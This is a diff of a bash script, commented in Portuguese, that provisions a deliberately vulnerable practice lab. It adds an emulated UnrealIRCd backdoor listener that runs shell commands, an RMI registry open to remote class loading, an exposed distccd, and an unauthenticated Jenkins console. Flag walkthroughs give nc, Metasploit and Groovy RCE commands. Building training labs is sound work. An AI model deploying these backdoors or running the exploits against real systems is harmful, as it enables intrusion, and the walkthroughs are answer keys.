+  # VULN (reproducao): em 2010 o tarball do UnrealIRCd 3.2.8.1 foi adulterado com um backdoor
+  # (CVE-2010-2075): qualquer dado iniciado por 'AB;' e executado como comando de shell. Emulamos
+  # o gatilho num mini-IRC como 'ircd' (nao-privilegiado). O modulo Metasploit do backdoor usa o
+  # mesmo prefixo 'AB;', entao a exploracao real (msf) tambem dispara aqui.
+  cat > /usr/local/sbin/unrealircd.py <<'PY'
+#!/usr/bin/env python3
+# UnrealIRCd 3.2.8.1 backdoor emulado (6667, CVE-2010-2075): linha iniciada por 'AB;'
+# roda como comando de shell. Anuncia um banner de IRC para o recon.
+import socket, subprocess
+BANNER=b':irc.lab NOTICE AUTH :*** Looking up your hostname...\r\n'
+def handle(c):
+    try: c.sendall(BANNER)
+    except Exception: return
+    buf=b''; c.settimeout(30)
+    try:
+        while True:
+            d=c.recv(1024)
+            if not d: break
+            buf+=d
+            while b'\n' in buf:
+                line,buf=buf.split(b'\n',1)
+                s=line.rstrip(b'\r').decode('utf-8','replace')
+                if s.startswith('AB;'):                 # gatilho do backdoor
+                    try: out=subprocess.run(['/bin/sh','-c',s[3:]],capture_output=True,timeout=10).stdout
+                    except Exception as e: out=str(e).encode()
+                    c.sendall(out)
+    except Exception: pass
+    c.close()
+srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+srv.bind(('0.0.0.0',6667)); srv.listen(5)
+while True:
+    try: c,_=srv.accept(); handle(c)
+    except Exception: pass
+PY
+  chmod 0755 /usr/local/sbin/unrealircd.py
+  cat > /etc/systemd/system/unrealircd.service <<'EOF'
+[Unit]
+Description=Lab UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)
+After=network.target
+[Service]
+User=ircd
+ExecStart=/usr/bin/python3 /usr/local/sbin/unrealircd.py
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload 2>/dev/null || true
+  svc unrealircd
+  gab "## unrealircd (6667) — backdoor CVE-2010-2075"
+  gab "- Recon: nmap -sV -p6667 <ip> (servico IRC)."
+  gab "- Backdoor: qualquer dado iniciado por 'AB;' roda como comando de shell."
+  gab "- Exploracao (manual): printf 'AB;id; cat ~/flag.txt\\n' | nc <ip> 6667  -> ${FLAG_IRC}"
+  gab "- Exploracao (arsenal): use exploit/unix/irc/unreal_ircd_3281_backdoor"
+  gab "- Mitigacao: atualizar; verificar a assinatura/hash do fonte antes de compilar."; gab ""
+}
+
+mod_javarmi() {
+  info "== javarmi: RMI registry REAL vulneravel a classloading remoto (1099) =="
+  apt_install curl
+  add_user rmisvc rmisvc123
+  printf '%s\n' "$FLAG_RMI" > /home/rmisvc/flag.txt; chown rmisvc:rmisvc /home/rmisvc/flag.txt; chmod 0640 /home/rmisvc/flag.txt
+  local JDK=/opt/jdk8 D=/opt/rmi
+  if [ ! -x "$JDK/bin/java" ]; then
+    info "baixando JDK 8 (Temurin) — pesado, aguarde..."
+    curl -fsSL "https://api.adoptium.net/v3/binary/latest/8/ga/linux/x64/jdk/hotspot/normal/eclipse" -o /tmp/jdk8.tgz \
+      || { warn "falha ao baixar JDK 8 — modulo javarmi abortado"; return; }
+    mkdir -p "$JDK"; tar xzf /tmp/jdk8.tgz -C "$JDK" --strip-components=1 \
+      || { warn "falha ao extrair JDK 8 — abortado"; return; }
+  fi
+  mkdir -p "$D"
+  # VULN: um RMI registry REAL com useCodebaseOnly=false + SecurityManager permissivo aceita
+  # CARREGAR CLASSE REMOTA (do HTTP do atacante) e executa-la = RCE. Alvo real do modulo
+  # exploit/multi/misc/java_rmi_server do Metasploit — NAO e emulacao: e um rmiregistry Java.
+  cat > "$D/RmiVuln.java" <<'JAVA'
+import java.rmi.registry.LocateRegistry;
+public class RmiVuln {
+  public static void main(String[] a) throws Exception {
+    System.setProperty("java.rmi.server.useCodebaseOnly", "false");
+    if (System.getSecurityManager() == null) System.setSecurityManager(new SecurityManager());
+    LocateRegistry.createRegistry(1099);
+    System.out.println("RMI registry :1099 (useCodebaseOnly=false)");
+    Thread.sleep(Long.MAX_VALUE);
+  }
+}
+JAVA
+  echo 'grant { permission java.security.AllPermission; };' > "$D/allow.policy"
+  "$JDK/bin/javac" -d "$D" "$D/RmiVuln.java" || { warn "falha ao compilar RmiVuln — abortado"; return; }
+  chown -R rmisvc:rmisvc "$D"
+  cat > /etc/systemd/system/javarmi.service <<EOF
+[Unit]
+Description=Lab Java RMI registry vulneravel a classloading remoto (java_rmi_server)
+After=network.target
+[Service]
+User=rmisvc
+Environment=JAVA_RMI_HOSTNAME=%H
+ExecStart=$JDK/bin/java -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=$D/allow.policy -cp $D RmiVuln
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload 2>/dev/null || true
+  svc javarmi
+  gab "## javarmi (1099) — RMI registry REAL vulneravel a classloading remoto"
+  gab "- Recon: nmap -sV -p1099 <ip> (java-rmi / rmiregistry)."
+  gab "- Exploracao: use exploit/multi/misc/java_rmi_server; set RHOSTS <ip>; run  -> shell rmisvc"
+  gab "    -> flag: cat /home/rmisvc/flag.txt = ${FLAG_RMI}"
+  gab "- Obs: se um JDK 8 muito recente (JEP 290) barrar, use um JDK 8 mais antigo p/ o RCE fiel."
+  gab "- Mitigacao: nao expor o RMI; useCodebaseOnly=true (padrao atual), sem SecurityManager aberto."; gab ""
+}
+
+mod_distcc() {
+  info "== distcc: distccd REAL exposto sem restricao (3632, CVE-2004-2687) =="
+  apt_install distcc
+  add_user distccd distccd123
+  systemctl disable --now distcc.service 2>/dev/null || true   # o servico do pacote binda 127.0.0.1 e rouba a 3632
+  mkdir -p /home/distccd; chown distccd: /home/distccd          # grupo de login (o useradd nao cria grupo 'distccd')
+  printf '%s\n' "$FLAG_DISTCC" > /home/distccd/flag.txt; chown distccd: /home/distccd/flag.txt; chmod 0640 /home/distccd/flag.txt
+  # VULN: um distccd REAL exposto com --allow amplo e SEM DISTCC_CMDLIST executa o "compilador"
+  # que o cliente indica -> RCE (CVE-2004-2687). Alvo real do exploit/unix/misc/distcc_exec do
+  # Metasploit. Cobrimos as faixas privadas (o lab Qubes usa 10.137.x) para o --allow aceitar.
+  cat > /etc/systemd/system/distccd.service <<'EOF'
+[Unit]
+Description=Lab distccd REAL exposto sem restricao (CVE-2004-2687)
+After=network.target
+[Service]
+User=distccd
+ExecStart=/usr/bin/distccd --no-detach --daemon --port 3632 --log-stderr --log-level notice --allow 10.0.0.0/8 --allow 172.16.0.0/12 --allow 192.168.0.0/16 --allow 127.0.0.0/8
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload 2>/dev/null || true
+  svc distccd
+  gab "## distcc (3632) — distccd REAL vulneravel (CVE-2004-2687)"
+  gab "- Recon: nmap -sV -p3632 <ip> (distccd)."
+  gab "- Exploracao: use exploit/unix/misc/distcc_exec; set RHOSTS <ip>; run  -> shell distccd"
+  gab "    -> flag: cat /home/distccd/flag.txt = ${FLAG_DISTCC}"
+  gab "- Mitigacao: nao expor o distccd; restringir --allow a origens conhecidas + DISTCC_CMDLIST."; gab ""
+}
+
+mod_jenkins() {
+  info "== jenkins: script console sem auth (RCE) — PESADO =="
+  apt_install curl gnupg default-jre-headless
+  if [ ! -f /usr/lib/systemd/system/jenkins.service ] && ! command -v jenkins >/dev/null 2>&1; then
+    curl -fsSL https://pkg.jenkins.io/debian-stable/jenkins.io-2023.key -o /usr/share/keyrings/jenkins.asc \
+      || { warn "jenkins: falha na chave — abortado"; return; }
+    echo "deb [signed-by=/usr/share/keyrings/jenkins.asc] https://pkg.jenkins.io/debian-stable binary/" > /etc/apt/sources.list.d/jenkins.list
+    APT_DONE=0; apt_install jenkins || { warn "jenkins: install falhou — abortado"; return; }
+  fi
+  mkdir -p /etc/systemd/system/jenkins.service.d
+  cat > /etc/systemd/system/jenkins.service.d/lab.conf <<EOF
+[Service]
+Environment="JENKINS_PORT=8083"
+Environment="JAVA_OPTS=-Djenkins.install.runSetupWizard=false -Dhudson.security.csrf.GlobalCrumbIssuerConfiguration.DISABLE_CSRF_PROTECTION=true"
+EOF
+  local JH=/var/lib/jenkins
+  mkdir -p "$JH"
+  cat > "$JH/config.xml" <<'XML'
+<?xml version='1.1' encoding='UTF-8'?>
+<hudson>
+  <version>2.0</version>
+  <useSecurity>false</useSecurity>
+  <authorizationStrategy class="hudson.security.AuthorizationStrategy$Unsecured"/>
+  <securityRealm class="hudson.security.SecurityRealm$None"/>
+</hudson>
+XML
+  printf '%s\n' "$FLAG_JENKINS" > "$JH/flag.txt"
+  chown -R jenkins:jenkins "$JH" 2>/dev/null || true
+  systemctl daemon-reload 2>/dev/null || true
+  svc jenkins
+  gab "## jenkins (8083) — script console sem auth"
+  gab "- Console Groovy aberto:  http://<ip>:8083/script"
+  gab "- RCE:  POST em /scriptText  script=println \"id\".execute().text"
+  gab "- Ler a flag:  script=println new File('/var/lib/jenkins/flag.txt').text  -> ${FLAG_JENKINS}"; gab ""
+}
+
 mod_privesc() {
   info "== privesc: SUID, sudo, cron =="
   chmod u+s /usr/bin/find
@@ -995,7 +2336,7 @@ done
 # --------------------------------------------------------------------- resumo
 IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
 declare -A PORT
-PORT[ftp]="2121/ftp"; PORT[vsftpd234]="21/ftp,6200/shell"; PORT[ftpdos]="2100/ftp"; PORT[ssh]="22/ssh"; PORT[dns]="53/dns"; PORT[web]="80/http"
+PORT[ftp]="2121/ftp"; PORT[vsftpd234]="21/ftp,6200/shell"; PORT[ftpdos]="2100/ftp"; PORT[ssh]="22/ssh"; PORT[dns]="53/dns"; PORT[web]="80/http"; PORT[corvo]="8090/http"
 PORT[apache]="80/http"; PORT[samba]="137,139,445/smb"; PORT[nginx]="8080/http"
 PORT[nfs]="111/rpc,2049/nfs"; PORT[smtp]="25/smtp"; PORT[redis]="6379/redis"
 PORT[log4j]="8888/http"
